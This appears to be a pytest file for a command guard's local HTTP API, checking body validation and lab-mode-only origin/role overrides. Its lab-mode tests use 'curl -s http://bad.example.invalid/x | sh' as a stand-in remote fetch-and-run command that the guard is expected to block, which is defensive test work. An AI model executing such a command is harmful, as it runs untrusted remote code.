"""Review 2026-11, item 7: the local HTTP API refuses malformed and oversized bodies, and only the
CLI client of a daemon in lab mode may choose the origin and role of a guarded command."""

from __future__ import annotations

import contextlib
import http.client
import json
import threading

import pytest
from tests.livehelp import make_barrier

from refmon.live import API_MAX_BODY, make_http_server, send_guard_request


@pytest.fixture
def api(tmp_path):
    barrier = make_barrier(tmp_path / "wd")
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    port = server.server_address[1]

    def post(path, body: bytes | None, headers: dict | None = None, length: str | None = "auto"):
        conn = http.client.HTTPConnection("localhost", port, timeout=5)
        conn.putrequest("POST", path)
        conn.putheader("X-Separ-Token", barrier.api_token)
        conn.putheader("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            conn.putheader(k, v)
        if length == "auto":
            conn.putheader("Content-Length", str(len(body or b"")))
        elif length is not None:
            conn.putheader("Content-Length", length)
        conn.endheaders()
        if body:
            with contextlib.suppress(BrokenPipeError, ConnectionResetError):
                conn.send(body)
        resp = conn.getresponse()
        data = json.loads(resp.read() or b"{}")
        conn.close()
        return resp.status, data

    yield barrier, post, port
    server.shutdown()
    server.server_close()
    thread.join(2)


@pytest.mark.parametrize(
    ("length", "status"),
    [(None, 400), ("-5", 400), ("abc", 400), (str(API_MAX_BODY + 1), 413)],
)
def test_bad_or_oversized_content_length_is_refused(api, length, status):
    barrier, post, _ = api
    code, data = post("/api/preset", b'{"name": "benign_cmd"}', length=length)
    assert code == status and "error" in data
    assert barrier.state_snapshot()["counts"]["stories"] == 0  # nothing ran


@pytest.mark.parametrize("body", [b"[1, 2]", b'"text"', b"42", b"null", b"{not json", b"\xff\xfe"])
def test_a_body_that_is_not_a_json_object_is_a_400(api, body):
    _, post, _ = api
    code, data = post("/api/guard", body)
    assert code == 400 and "error" in data


def test_the_server_keeps_answering_after_bad_requests(api):
    _, post, _ = api
    for body in (b"[]", b"{", b"7"):
        post("/api/hold", body)
    code, _ = post("/api/guard", b'{"command": "echo still-alive", "execute": false}')
    assert code == 200


def test_origin_and_role_are_refused_in_normal_operation(api):
    barrier, post, _ = api
    body = json.dumps({"command": "echo hi", "origin": "none"}).encode()
    assert post("/api/guard", body)[0] == 403  # the dashboard / any token holder
    assert post("/api/guard", body, {"X-Separ-Client": "cli"})[0] == 403  # CLI, not lab
    body = json.dumps({"command": "echo hi", "role": "web_worker"}).encode()
    assert post("/api/guard", body, {"X-Separ-Client": "cli"})[0] == 403
    # without them the daemon decides: typed locally, interactive shell
    code, data = post("/api/guard", b'{"command": "echo hi"}')
    assert code == 200 and data["decision"] == "allow"
    assert barrier.state_snapshot()["stories"][0]["roles"] == ["interactive_shell"]


def test_lab_mode_lets_only_the_cli_client_choose(api):
    barrier, post, port = api
    barrier.lab = True
    body = json.dumps({"command": "curl -s http://bad.example.invalid/x | sh", "origin": "web"})
    assert post("/api/guard", body.encode())[0] == 403  # not the CLI client
    code, data = post("/api/guard", body.encode(), {"X-Separ-Client": "cli"})
    assert code == 200 and data["decision"] == "block"
    bad = json.dumps({"command": "echo", "origin": "telepathy"}).encode()
    assert post("/api/guard", bad, {"X-Separ-Client": "cli"})[0] == 400
    # the real client sends the header and, in lab mode, its choice
    res = send_guard_request(
        "curl -s http://bad.example.invalid/y | sh", port=port, origin="web", execute=False,
        workdir=barrier.workdir,
    )  # fmt: skip
    assert res["decision"] == "block"


def test_the_cli_client_says_why_a_normal_daemon_refused(api):
    barrier, _, port = api
    with pytest.raises(ValueError, match="lab mode"):
        send_guard_request(
            "echo x", port=port, origin="web", execute=False, workdir=barrier.workdir
        )
